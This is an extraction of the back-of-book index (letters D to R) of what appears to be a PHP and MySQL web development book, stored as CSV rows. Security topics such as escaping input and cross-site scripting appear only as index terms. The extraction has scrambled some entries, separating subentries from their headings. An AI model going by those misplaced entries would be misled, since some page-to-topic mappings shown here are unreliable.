Larger Text,Smaller Text,Symbol
D,"\D (nondigit character) in regular 
  
  
  
  
 expressions, 331 
  
 \d (digit character) in regular 
  
  
  
  
 expressions, 331 
  
 data structures (in databases), 131 
  
 data types 
  
  
 changing for column in MySQL 
  
  
  
  
 database, 136 
  
  
 column, 154–155 
  
  
  
 common MySQL types, 154 
  
  
 dates and times, used in database 
  
  
  
  
 functions, 172 
  
  
 defined, 154 
  
  
 operands, 65 
  
  
 variables, 45 
  
  
  
 converting to required type, 45 
  
 database abstraction 
  
  
 PDO, 372 
  
  
 PEAR DB classes, 179 
  
 database commands (MySQL), 124 
  
 database engines, 6 
  
 database functions, 164–178 
  
  
 date and time functions, 170–177 
  
  
  
 date and time arithmetic, 172–175 
  
  
 days, weeks, months, and 
  
  
  
  
 years, 170–172 
  
  
  
 formatting dates for display, 175–176 
  
  
 hours, minutes, and seconds, 172 
  
  
 Unix timestamp conversion, 176 
  
  
 PHP, 179 
  
  
 string functions, 164–169 
  
  
  
 CONCAT, 165 
  
  
  
 CONCAT_WS, 165 
  
  
  
 cutting strings into substrings, 168
  
  
 Index
  
 | 395",NA
E,"each( ) function, 115 
  
 echo function, 86 
  
 echo( ) function, 40 
  
 elements 
  
  
 acting as hyperlinks, XHTML 2.0, 255 
  
 array, 107 
  
  
  
 counting, 112 
  
  
  
 scalar values, 108 
  
  
 HTML, 11 
  
 else statement, 73 
  
 email address, regular expression 
  
  
  
  
 describing, 330 
  
 ENCLOSED BY char, 159 
  
 encoding passwords, 311 
  
 encrypting passwords, 311 
  
 endswitch, using to end switch statement, 
 77 enterprise databases, 7 
  
 equality (==) operator, 53, 68, 69 
  
 ereg-style regular expressions, 329 
  
 error control operator (@), 320 
  
 error levels, 337 
  
 error logging (PHP), 336 
  
 error_log parameter, 337 
  
 error_reporting parameter, 337 
  
 errorMessage function, 196 
  
 errors 
  
  
 common pitfalls in XHTML code, 258 
  
 connection to database, 184 
  
  
 database, handling from PHP, 265 
  
  
 displaying from PHP and redisplaying 
  
  
  
  
 form, 333–336 
  
  
 generating using switch and DEFAULT: 
  
  
  
 statements, 76 
  
  
 inhibiting (@ operator), 68 
  
  
 PEAR error reporting, 196 
  
 escaped characters, 51 
  
 escapeshellcmd function, 249 
  
 escapeSimple function (PEAR), 274 
  
 escaping user input, 319, 322
  
  
 combining with operators into 
 more 
  
  
 complex expressions, 
 63 
  
  
 defined, 62 
  
  
 formatting in PHP, 368 
  
  
 literals and variables, 62 
  
  
 valid expressions (examples), 62 
 extends operator, 101 
  
 extensions, loading into Apache, 5 
  
 extract function, 117 
  
  
 EXTR_PREFIX_ALL option, 118",NA
F,"feet-to-meters converter (in PHP), 212 
  
 Fetch (FTP client), 36 
  
 fetchRow function, 196 
  
 file comments (PHP), 367 
  
 file manipulation functions, PHP, 238–248 
  
 checking permissions, 239 
  
  
 creating files, 240 
  
  
 deleting files with unlink command, 241 
  
 file_exists function, 239 
  
  
 rename function, 242 
  
  
 uploading files, 243–248 
  
  
  
 accessing the file, 244 
  
  
  
 is_uploaded_file function, 244 
  
  
  
 move_uploaded_file function, 246 
  
  
 validation, 244–248 
  
  
 URL wrappers, 242 
  
 file_exists function, using with touch and 
  
  
  
 unlink commands, 241 
  
 file_get_contents function, 242 
  
 $_FILES global array, 244 
  
 files 
  
  
 include files, 310 
  
  
 including and requiring PHP files, 370 
  
 verifying integrity of with md5 
  
  
  
  
 function, 88 
  
 Fink, downloading and installing, 33 
  
 firewall setup utilities, 321 
  
 FIRST keyword, 137
  
  
 Index
  
 | 397",NA
G,"garbage collection, 299 
  
  
 PHP .ini variables for, 300 
  
 GET operations, data from, 318 
  
 get_magic_quotes_gpc function, 323 
 global variables, 46 
  
  
 automatic, security risks, 312–
 316 
  
 naming, 369 
  
  
 super globals, 49
  
 398
  
 |
  
 Index",NA
H,"hashcheck function, 87 
  
 heading element <h> in XHTML 2.0, 255 
 Hello world! program (example), 86 
  
 hidden form elements, 206 
  
 HOUR function, 172 
  
 .htaccess file, 300 
  
  
 securing directories containing 
  
  
  
  
 administrative scripts, 308 
  
 HTML 
  
  
 CSS, controlling appearance of pages, 10 
  
 directory.html file, 12 
  
  
 markup, 11 
  
  
 PHP and, 39–43 
  
  
  
 text output, 39–43 
  
  
 PHP templates and, 7 
  
  
 separating from PHP processing 
  
  
  
  
 code, 218 
  
 HTML forms (see forms) 
  
 htmlentities function, 274 
  
  
 escaping special characters, 319 
  
 htpasswd command, 309 
  
 HTTP, 1 
  
  
 default port, 18 
  
  
 TCP/IP, 2 
  
 HTTP authentication, 288–294 
  
  
 storing login information in a 
  
  
  
  
 database, 290–292 
  
  
 using with a PHP script, 289 
  
  
 validating username and password, 290 
  
 verifying login information against 
  
  
  
  
 database, 292 
  
 $HTTP_POST_FILES array, 244 
  
 hyperlinks (see links)",NA
I,"<i>, <b>, and <tt> elements, no longer 
  
 supported in XHTML 2.0, 255 
 IDE (Integrated Development
  
 img elements in XHTML 2.0, 255 
  
 implicit casting, 65 
  
 importing data from another database, 159 
 include files, 310 
  
 include function 
  
  
 handling of missing files, 310 
  
 include statement, 92 
  
  
 problems with, 94 
  
 include_once statement, 93 
  
  
 problems with, 94 
  
 include_path function, 242 
  
 including files, 370 
  
 increment operator (++), 68 
  
 incrementing/decrementing 
  
  
 autoincrement and autodecrement, 59 
  
 preincrement -decrement, 59 
  
 indenting (PHP code), 368 
  
 index files (PHP), mapping on Mac OS X 
  
  
  
 10.2 to DirectoryIndex, 26 
  
 indexes 
  
  
 array, 107 
  
  
  
 numeric indexed arrays, 107 
  
  
  
 query results, 187 
  
  
  
 specifying, 109 
  
  
  
 supplied by PHP, 109 
  
  
 database, 159–163 
  
  
  
 EXPLAIN command, 162 
  
  
  
 multicolumn indexes, 161 
  
  
  
 when to use, 160 
  
  
  
 where to specify, 160 
  
  
 MySQL database, 134 
  
 infinite loops, 78 
  
 information from many sources, 
  
  
  
  
 integrating, 7–11 
  
  
 CSS (Cascading Style Sheets), 10 
  
  
 PHP templates, 8 
  
 inheritance in OOP, 101–104 
  
 ini_set function, 319 
  
 initializing variables for improved 
  
  
  
  
 security, 316
  
 Environment), 116
  
 Index
  
 | 399",NA
J,"JavaScript 
  
  
 in Ajax, 373 
  
  
 code in cross-site scripting attack, 
 321 
  
 validating user data, 325–329 
  
  
  
 regular expressions, 326 
  
 joins 
  
  
 JOIN ON keyword, 142 
  
  
 LEFT JOIN ON clause, using with 
  
  
  
 SELECT, 163",NA
L,"LCASE and UCASE functions, 166 
  
 leading spaces or characters, trimming from 
  
  
 strings, 167 
  
 LEFT function, 168 
  
 LEFT JOIN ON clause, 163 
  
 LENGTH function, 166 
  
 length of a string (strlen), 230 
  
 Lerdorf, Rasmus, 4 
  
 less than (<) operator, 53 
  
 less than or equal to (<=) operator, 54 
  
 LIKE keyword, 143 
  
 links 
  
  
 deleting current row in a database, 277 
  
 displaying database query results with 
  
  
 embedded links, 267–270 
  
  
 elements in XHTML 2.0, 255 
  
 Linux 
  
  
 installing Apache, PHP, and MySQL, 16 
  
 MySQL datafiles directory, 156 
  
  
 phpMyAdmin configuration file, 126 
 literals, 62 
  
  
 regular expression, 330 
  
 LOCATE function, 168 
  
 logical AND operator, 68 
  
 logical NOT operator (!), 68 
  
 logical operators, 70 
  
  
 logical statements and their results, 71 
  
 using in WHERE clause, 140, 144 
  
 logical OR operator, 68 
  
 logical XOR operator, 68 
  
 logically grouping related data, 150 
  
 login settings for MySQL, 181 
  
 login systems, use of session variables, 297 
 login.php file, 13 
  
 loops, 77–83 
  
  
 breaking out of, 81 
  
  
 continue statements, using, 82 
  
  
 do ... while, 79 
  
  
 for loops, 80 
  
  
 infinite, 78 
  
  
 iterations, 77 
  
  
 looping through array items and 
  
  
  
 referencing array values, 111 
  
  
 while loops, 78 
  
 LPAD and RPAD functions, 166 
  
 LTRIM and RTRIM functions, 167
  
 400
  
 |
  
 Index",NA
M,"Mac OS X 
  
  
 accessing MySQL with command 
  
  
  
  
 line, 123 
  
  
 Apache, 16 
  
  
 enabling PHP, 25 
  
  
 MySQL datafiles directory, 156 
  
  
 MySQL installation, 33 
  
 magic quotes, 322 
  
  
 checking whether it’s enabled, 323 
  
  
 escaping user input, 273 
  
 many-to-many relationships (database), 
 148 math, 57–60 
  
  
 autoincrement and autodecrement, 59 
  
 basic operators, 57 
  
  
 combined assignment operations, 58 
  
 preincrement and -decrement, 59 
  
 mathematical operations, 57 
  
 mathematical operators, types of 
  
  
  
  
 operands, 65 
  
 MAX clause, using an index, 160 
  
 MAXLENGTH attribute, setting in form text 
  
  
  
 fields, 326 
  
 md5 function, 87 
  
 md5 one-way encrypt function, 311 
  
 MDB2 (PEAR database interface), 196 
  
 message digest, 87 
  
 metacharacters (regular expression), 330 
  
 quantifiers, 331 
  
 method keyword, 199 
  
 methods, 96, 97 
  
  
 static, 104 
  
 Microsoft 
  
  
 Active Server Pages (ASP), 4 
  
  
 Windows (see Windows) 
  
 MIME type, setting for XHTML 
  
  
  
  
 documents, 262 
  
 MIN clause, using an index, 160 
  
 minimized attributes (HTML), 260 
  
 MINUTE function, 172 
  
 mirrors (download locations), 16 
  
 mktime function, 237 
  
 MODIFY command, 137 
  
 modules 
  
  
 Apache, 5 
  
  
  
 online source, 5 
  
  
 PEAR, categories of, 190 
  
  
 PHP, uncommenting line that loads on 
  
  
  
 Mac OS X, 26 
  
 modulo (%) operator, 57 
  
 MONTH function, 171
  
 MONTHNAME function, 171 
  
 move_uploaded_file function, 246 
  
 multicolumn indexes, 161 
  
 multidimensional arrays, 114–116 
  
  
 creating, 115 
  
  
 displaying, 115 
  
 multiline comments, 42 
  
 multiplication (*) operator, 57 
  
 multiplication assignment (*=) operator, 58 
 MySQL, 122–145 
  
  
 accessing the database with the 
 command 
  
  
  
 line, 123–
 125 
  
  
  
 commands available at MySQL 
  
  
  
  
 prompt, 124 
  
  
  
 MySQL prompts, 124 
  
  
 administering with 
  
  
  
  
 phpMyAdmin, 126–129 
  
  
 common data types, 154 
  
  
 connecting to database from PHP, 180 
  
 connecting to the database, 122 
  
  
 data types, online listing of types, 155 
  
 database concepts, 131–132 
  
  
 database engines, 6 
  
  
 database objects, changing from 
  
  
  
  
 PHP, 263–265 
  
  
  
 creating a table, 263–265 
  
  
  
 dropping a table, 265 
  
  
  
 handling errors, 265 
  
  
 development history, 6 
  
  
  
 major releases and features, 6 
  
  
 functions, using, 164–178 
  
  
 installing, 27–33 
  
  
  
 Mac OS X installation, 33 
  
  
  
 on Linux, 16 
  
  
  
 PHP Connector, 32 
  
  
 managing the database, 125 
  
  
  
 creating a database, 126 
  
  
  
 creating users, 125 
  
  
 manipulating data from PHP, 266 
  
  
  
 deleting data, 277–281 
  
  
  
 displaying results with embedded 
  
  
  
  
 links, 267–270 
  
  
  
 form to add data to a table, 270–276 
  
  
 performing a subquery, 282–284 
  
  
  
 updating data, 276 
  
  
 place in web development, 2 
  
  
 preventing access to the database, 320 
  
  
 for external hosts, 321 
  
  
 relational database, 146 
  
  
 separate database users for each 
  
  
  
  
 application, 321
  
  
 Index
  
 | 401",NA
N,"\n (newline character) in 
 regular 
  
 expressions, 331 
  
 namespaces, XML, 254 
  
 naming guidelines, 369",NA
O,"object-oriented programming 
  
  
  
 (OOP), 96–105 
  
  
 classes, 96 
  
  
 creating a class, 96 
  
  
 creating a class instance, 97 
  
  
 inheritance, 101–104 
  
  
 methods and constructors, 97 
  
  
 static methods and variables, 104 
  
  
 variable references, 105 
  
  
 variable scope within classes, 99 
  
 objects, 369 
  
  
 creating a new object and assigning it to 
 a 
   
 variable, 99 
  
  
 in object-oriented programming, 96 
  
 off-by-one error (array indexes), 107 
  
 one-to-many relationships (database), 148 
 one-to-one relationships (database), 147 
 online resources for dynamic web 
  
  
  
 development, xi 
  
 OOP (see object-oriented programming) 
 open source, value of, 3
  
 402
  
 |
  
 Index",NA
P,"padding strings, 166 
  
  
 printf function (PHP), 226–228 
 parameters (constructor methods), 98 
 parameters (function), 86, 89 
  
  
 default values in, 90 
  
  
 parameter references, 91
  
  
  
 displaying, 346–348 
  
 changing database objects from, 263–
 265 
  
 creating a table, 263–265 
  
  
 dropping a table, 265 
  
  
 handling errors, 265 
  
 code building blocks, 43–60 
  
  
 concatenation, 54 
  
  
 constants, 55–56
  
  
 Index
  
 | 403",NA
Q,"quantifiers (regular expression), 331 
  
 query function, 195 
  
 querying the database 
  
  
 basic steps in process, 180 
  
  
 building SQL SELECT query, 185 
  
  
 closing the connection, 187 
  
  
 connecting to MySQL database, resources 
  
  
 for, 180 
  
  
 fetching and displaying results, 186 
  
  
 having database execute the query, 186 
  
 PEAR functions, using, 190–197 
  
  
 PHP functions, using, 180–190 
  
  
 putting it all together (example), 187–190 
  
 unions, 6 
  
  
 using form data, 215–217 
  
 quotation marks 
  
  
 in data for MySQL database tables, 135 
  
 magic quotes (see magic quotes) 
  
  
 in strings, 51",NA
R,"\r (carriage return) in regular 
  
  
  
 expressions, 331 
  
 radio buttons (form), 205 
  
  
 setting up, 210 
  
  
 validating user input from, 210 
  
 RDBMS (Relational Database Management 
  
  
 System), 6 
  
 realm for HTTP authentication, setting, 303 
 records (database), 132 
  
 redirection operator (>), 156 
  
 reference operator (&), 105 
  
 reference parameters, 91 
  
 references, variable, 105 
  
 register_globals setting, 312 
  
  
 reading session variables from, 314 
  
 regular expressions, 326, 329–333 
  
  
 anchors, 331 
  
  
 character classes, 332 
  
  
 ereg, 329 
  
  
 executing in PHP, 332 
  
  
 literals, 330 
  
  
 metacharacters, 330 
  
  
 Perl format, 332 
  
  
 Perl-compatible, 329 
  
  
 quantifiers, 331 
  
  
 syntax (example), 330 
  
 Relational Database Management System
  
 (RDBMS), 6
  
 Index
  
 | 405",NA
